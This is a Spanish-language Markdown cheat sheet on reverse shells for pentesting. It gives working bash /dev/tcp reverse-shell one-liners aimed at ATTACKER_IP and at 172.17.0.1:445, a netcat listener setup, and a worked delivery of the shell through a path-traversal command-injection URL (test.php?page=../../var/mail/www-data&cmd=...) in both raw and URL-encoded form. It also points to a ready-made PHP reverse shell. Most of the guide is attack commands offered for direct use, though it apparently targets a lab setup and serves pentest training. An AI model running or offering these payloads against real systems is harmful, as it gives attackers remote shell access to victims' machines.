# 🐚 Reverse Shell Cheat Sheet

Guía rápida para comprender, generar y utilizar reverse shells en entornos de pentesting.

---

## 📚 Tabla de contenidos

- [¿Qué es una reverse shell?](#qué-es-una-reverse-shell)
- [Proceso típico](#proceso-típico)
- [Ejemplo de reverse shell en Bash](#ejemplo-de-reverse-shell-en-bash)
- [Reverse shell: procedimiento práctico](#reverse-shell-procedimiento-práctico)
- [Recursos para encontrar o generar reverse shells](#recursos-para-encontrar-o-generar-reverse-shells)
- [Tips y buenas prácticas](#tips-y-buenas-prácticas)
  - [Uso de `bash -c`](#uso-de-bash--c)
  - [Envío de reverse shell a través de una URL (URL encoding)](#envío-de-reverse-shell-a-través-de-una-url-url-encoding)
- [Recomendaciones adicionales](#recomendaciones-adicionales)

---

## 🎭 ¿Qué es una reverse shell?

Una **reverse shell** es una técnica utilizada principalmente en **pruebas de penetración (pentesting)** para obtener acceso remoto a un sistema comprometido.  
Permite al atacante controlar el sistema víctima mediante una conexión saliente desde la víctima hacia el atacante.  
De esta forma se pueden evadir restricciones de firewall que bloquean conexiones entrantes.

---

## 🔄 Proceso típico

1. El atacante configura un servidor a la escucha (por ejemplo, con `nc -lvp 4444` o herramientas como Metasploit).
2. El atacante logra ejecutar código en la víctima (por ejemplo, mediante una inyección o exploit).
3. Ese código en la víctima abre una conexión de red hacia el atacante (por ejemplo, a la IP del atacante en el puerto 4444) y redirige la shell a través de esa conexión.
4. El atacante recibe un **prompt de shell** interactivo de la máquina víctima.

---

## 🖥️ Ejemplo de reverse shell en Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## 🛠️ Reverse shell: procedimiento práctico

### Pasos

1. Determinar nuestra IP y la IP de la víctima.
2. Ponernos a la escucha en un puerto (listener) donde recibiremos la reverse shell.
3. Enviar y ejecutar la reverse shell.

### Ejemplo completo:

```
Nuestra IP   --> 172.17.0.1
IP víctima   --> 172.17.0.2
```

Ponemos a la escucha en el puerto 445:

```bash
nc -nvlp 445
```

Enviamos la reverse shell (por el medio que hayamos encontrado):

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
```

En el listener de `nc`, se establece la conexión interactiva.

---

## 🌐 Recursos para encontrar o generar reverse shells

- [Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [RevShells Online Generator](https://www.revshells.com/)

---

## 🧠 Tips y buenas prácticas

### ⚙️ Uso de `bash -c`

Si la reverse shell es en Bash, es recomendable utilizar:

```bash
bash -c "reverse shell"
```

Esto hace que el intérprete Bash ejecute una cadena de texto como si fuera un script o una serie de comandos.

- `bash` → invoca el intérprete de comandos Bash.
- `-c` → "execute commands from the following string" (ejecuta comandos desde la cadena que viene a continuación).
- `'...'` → la cadena de comandos que se desea ejecutar.

#### Ejemplo:

```bash
bash -c 'comando1; comando2; ...'
```

---

### 🌍 Envío de reverse shell a través de una URL (URL encoding)

Si el vector de envío de la reverse shell es a través de una URL, es recomendable **encodear** la reverse shell.

#### Ejemplo:

Vector de entrada:

```
http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=<COMANDO A ENVIAR>
```

Reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
```

Envío directo en la URL (sin encodear):

```
http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
```

⚠️ Esto probablemente cause un error de interpretación, por lo que se recomienda encodear la reverse shell.

#### Encodeo manual:

Usar [https://www.urlencoder.org/](https://www.urlencoder.org/) para obtener la versión encodeada.

Resultado:

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
```

Envío final:

```
http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
```

👉 Desde [https://www.revshells.com/](https://www.revshells.com/) también tienes la opción de encodear directamente.

---

## 📝 Recomendaciones adicionales

- **Probar diferentes tipos de reverse shell** si Bash no funciona (por ejemplo: PHP, Python, Perl, Netcat con `-e`, etc.).
- Una **reverse shell en PHP** lista para usar se puede obtener en:

```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
```

Solo debes editar la IP y el puerto en el código antes de desplegarla.

---

## 🚀 ¡Happy Hacking! 🐚

---

